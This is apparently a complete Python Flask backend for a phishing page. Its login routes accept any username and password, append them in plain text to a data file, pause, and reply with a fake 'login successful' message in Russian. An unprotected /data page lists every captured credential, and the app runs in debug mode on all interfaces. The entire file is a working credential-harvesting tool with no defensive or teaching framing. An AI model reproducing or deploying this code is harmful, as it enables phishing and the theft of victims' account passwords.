from flask import Flask, render_template, request, redirect, url_for, jsonify
import os
import time

app = Flask(__name__)

DATA_FILE = 'data.txt'

def save_credentials(login, password):
    with open(DATA_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{login}:{password}\n")

def get_all_credentials():
    if not os.path.exists(DATA_FILE):
        return []
    
    credentials = []
    with open(DATA_FILE, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line:
                login, password = line.split(':', 1)
                credentials.append({'login': login, 'password': password})
    return credentials

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    login = request.form.get('login', '').strip()
    password = request.form.get('password', '').strip()  
    if login and password:
        save_credentials(login, password)
        time.sleep(30)
    return redirect(url_for('index'))

@app.route('/api/login', methods=['POST'])
def api_login():
    login = request.json.get('login', '').strip()
    password = request.json.get('password', '').strip()
    if login and password:
        save_credentials(login, password)
        time.sleep(30)
        return jsonify({'status': 'success', 'message': 'Вход выполнен успешно'})
    return jsonify({'status': 'error', 'message': 'Неверные данные'})

@app.route('/data')
def show_data():
    credentials = get_all_credentials()
    return render_template('data.html', credentials=credentials)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
